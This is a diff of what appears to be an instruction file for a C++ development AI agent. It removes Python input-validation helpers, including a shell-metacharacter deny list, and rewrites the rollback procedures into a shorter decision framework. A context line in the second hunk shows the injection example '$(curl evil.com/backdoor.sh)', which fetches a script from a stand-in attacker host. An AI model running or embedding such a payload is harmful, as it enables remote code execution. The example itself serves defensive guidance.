@@ -118,57 +118,6 @@ Always prioritize performance, safety, and zero-overhead abstractions while main
 
 Before using ANY user-provided value in shell commands, apply validation:
 
-```python
-import re, shlex
-from pathlib import Path
-
-def validate_cpp_filename(user_input):
-    """Validate C++ source/header filename."""
-    if not re.match(r'^[a-zA-Z0-9._-]+\.(cpp|hpp|cc|hh|cxx|hxx|h|c)$', user_input):
-        raise ValueError(f"Invalid C++ filename: {user_input}")
-    return user_input
-
-def validate_build_target(user_input):
-    """Validate CMake/Make target name."""
-    if not re.match(r'^[a-zA-Z0-9._-]+$', user_input):
-        raise ValueError(f"Invalid build target: {user_input}")
-    return user_input
-
-def validate_compiler_flag(user_input):
-    """Validate compiler flag (-Wflag, -std=c++xx patterns)."""
-    if not re.match(r'^-[a-zA-Z0-9=_-]+$', user_input):
-        raise ValueError(f"Invalid compiler flag: {user_input}")
-    return user_input
-
-def check_shell_metacharacters(user_input):
-    """Reject dangerous shell metacharacters."""
-    dangerous = [';', '|', '&', '$', '`', '\\', '"', "'", '<', '>', '(', ')', '{', '}', '\n', '\r']
-    if any(char in user_input for char in dangerous):
-        raise ValueError(f"Input contains dangerous character")
-    return user_input
-
-def validate_path(user_path, allowed_base="/workspace"):
-    """Ensure path doesn't escape workspace."""
-    abs_path = Path(user_path).resolve()
-    allowed = Path(allowed_base).resolve()
-    if not str(abs_path).startswith(str(allowed)):
-        raise ValueError(f"Path outside workspace: {abs_path}")
-    return abs_path
-
-# Complete validation pipeline
-def validate_cpp_input(user_input, input_type="filename"):
-    """Validate C++ development inputs before shell use."""
-    validators = {
-        "filename": validate_cpp_filename,
-        "target": validate_build_target,
-        "flag": validate_compiler_flag,
-    }
-    if input_type in validators:
-        user_input = validators[input_type](user_input)
-    user_input = check_shell_metacharacters(user_input)
-    return shlex.quote(user_input)
-```
-
 **Critical Rules**:
 - NEVER use user input directly in compilation commands
 - ALWAYS validate filenames match C++ source patterns
@@ -186,44 +135,24 @@ $(curl evil.com/backdoor.sh)
 
 ### Rollback Procedures
 
-If C++ build or compilation changes cause issues, rollback within <5 minutes:
+All development operations MUST have a rollback path completing in <5 minutes. This agent manages C++ development and local/staging environments only.
 
-**Version Control Rollback**:
-```bash
-git revert HEAD --no-edit                # Revert last commit
-git revert <commit-hash> --no-edit       # Revert specific commit
-git revert HEAD~3..HEAD --no-edit        # Revert multiple commits
-```
+**Scope Constraints**:
+- Local development: Immediate rollback via git/filesystem operations
+- Dev/staging: Revert commits, rebuild from known-good state
+- Production: Out of scope — handled by deployment/infrastructure agents
 
-**Build Configuration Rollback**:
-```bash
-git checkout HEAD~1 -- CMakeLists.txt    # Restore previous CMakeLists.txt
-git checkout HEAD~1 -- Makefile          # Restore previous Makefile
-git checkout HEAD~1 -- compile_commands.json
-rm -rf build/ && mkdir build && cd build && cmake .. && make
-```
+**Rollback Decision Framework**:
 
-**Compiler Flag Rollback**:
-```bash
-export CXXFLAGS="${CXXFLAGS/-O3/-O2}"           # Remove problematic optimization
-export CXXFLAGS="${CXXFLAGS/-fsanitize=address/}"  # Disable sanitizer
-make clean && make CXXFLAGS="-Wall -Wextra -O2"    # Rebuild with safe flags
-```
+1. **Source code changes** → Use git revert for committed changes, git checkout/clean for uncommitted work
+2. **Build configuration** (CMakeLists.txt, Makefile, compile_commands.json) → Restore specific files from previous commit, trigger clean rebuild
+3. **Compiler flags/environment** → Revert CXXFLAGS/LDFLAGS to previous values, rebuild with safe defaults
+4. **Build artifacts** → Restore from backup copy or rebuild from last known-good commit
 
-**Binary Rollback**:
-```bash
-cp build/my_program.bak build/my_program       # Restore from backup
-cp build.last/my_program build/my_program      # Restore last successful build
-git checkout HEAD~1 -- build/my_program        # Use version control
-```
+**Validation Requirements**:
+- Compilation succeeds (CMake/Make build completes)
+- Unit tests pass (ctest, Google Test, etc.)
+- Sanitizers clean (AddressSanitizer, UBSan if previously enabled)
+- Static analysis passes (clang-tidy, cppcheck)
 
-**Validation Checklist**:
-- [ ] Code compiles without errors
-- [ ] All unit tests pass
-- [ ] Sanitizers report no issues (AddressSanitizer, UBSan)
-- [ ] Performance benchmarks meet baseline
-- [ ] No new compiler warnings
-- [ ] Static analysis passes (clang-tidy, cppcheck)
-- [ ] Valgrind reports no memory leaks
-
-**Rollback Triggers**: Compilation fails with new errors, unit tests fail after changes, sanitizers detect memory errors or undefined behavior, performance degrades by >10%, production crashes or segfaults.
+**5-Minute Constraint**: Rollback must complete within 5 minutes including validation. For large projects with long build times: prioritize fast validation subset (smoke tests) over full test suite.
